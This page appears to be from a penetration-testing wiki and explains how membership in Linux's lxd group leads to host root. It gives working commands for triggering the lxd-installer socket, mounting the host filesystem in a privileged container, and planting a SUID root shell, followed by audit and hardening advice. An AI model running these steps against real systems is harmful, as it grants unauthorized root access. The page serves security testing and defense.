# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

Membership in the host's LXD management group (normally _**lxd**_) can provide a path to root by allowing full control of the daemon.<sup>[[1]](#references)</sup> This is the same trust-boundary problem described for [runtime control sockets](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md) and [writable host mounts](../../containers-namespaces/container-security/sensitive-host-mounts.md): access to the management API can be sufficient even when the current process is not already inside a container.<sup>[[1]](#references)</sup>

## Ubuntu `lxd-installer` socket activation

Do not assume that `lxd` membership is harmless merely because the LXD snap is absent. On Ubuntu Server 24.04 and later, the seeded `lxd-installer` package exposes `/run/lxd-installer.socket` as `root:lxd` with mode `0660`. A connection activates `lxd-installer@.service` as root, which installs the LXD snap without a sudo password or polkit authorization; some wrapper versions also omit their confirmation prompt when standard input is not a TTY.<sup>[[10]](#references)[[11]](#references)</sup>

Inspect both the account membership and the socket-activated service:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

An authorized `lxd`-group test can activate the installer through the normal `lxc` wrapper or by connecting directly to the socket. The latter shows that the Unix-socket ACL, rather than the wrapper prompt, is the actual authorization boundary:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

Once the daemon is available, continue with the privileged-container techniques below.<sup>[[10]](#references)[[11]](#references)</sup>

## Exploiting without internet

### Method 1

You can download an Alpine image to use with LXD from a trusted repository.
Canonical's LXD image server publishes daily builds: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Just grab both **lxd.tar.xz** and **rootfs.squashfs** from the newest build (the directory name is the date).<sup>[[8]](#references)</sup>

Alternatively, you can install distrobuilder on your machine by following the [project instructions](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

Upload **incus.tar.xz** (**lxd.tar.xz** if you downloaded from the Canonical image server) and **rootfs.squashfs**, then import the image and create a container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
> Run **`lxd init`**, set up a default storage pool, then **repeat** the previous chunk of commands.<sup>[[2]](#references)</sup>

Finally, start the container and open a root shell on the host filesystem:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

Because UID 0 in this privileged instance is not remapped, it can create a host-owned SUID payload through the mounted host root. This completes the container-to-host pivot instead of leaving the operator in a container shell:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

Place the payload on a filesystem that honors SUID. A separate `/tmp` is commonly mounted `nosuid` and might not appear beneath a non-recursive bind of the host `/`, so a path such as `/rootbash` on the host root filesystem is more reliable for this proof.<sup>[[10]](#references)[[11]](#references)</sup>

### Method 2

Build an Alpine image and start it with the flag `security.privileged=true`, which maps container root to host root; mounting `/` then exposes the host filesystem inside the container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## Host-wide AppArmor side effect

Starting the LXD snap can also write `/run/sysctl.d/zz-lxd.conf` and set both `kernel.apparmor_restrict_unprivileged_userns` and `kernel.apparmor_restrict_unprivileged_unconfined` to `0`. This weakens Ubuntu's unprivileged-user-namespace restrictions for every local user, so record the values before and after activating LXD when assessing the host.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## Audit and hardening

Treat `lxd` membership as a root grant. Removing an unnecessary member takes effect for new login sessions; purging `lxd-installer` or masking its socket only removes the on-demand installation path and does **not** constrain a user who can already reach an installed LXD daemon.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

Useful compromise indicators include LXD instances with `security.privileged=true`, disk devices whose `source` is `/`, unexpected connections to `/run/lxd-installer.socket`, new SUID files, and a transition of the AppArmor sysctls above from `1` to `0`.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [How to harden security for LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD containers and virtual machines](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [How to copy and import images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [How to build images with distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Alpine image definition](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [lxd-alpine-builder build script](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD image server](https://images.lxd.canonical.com/)
- [9] [Type: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [STAR Labs LXD group privilege-escalation report and PoC](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [Old Wine in a New Bottle: A Decade-Old LXD Group Root Re-Armed](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)

{{#include ../../../banners/hacktricks-training.md}}
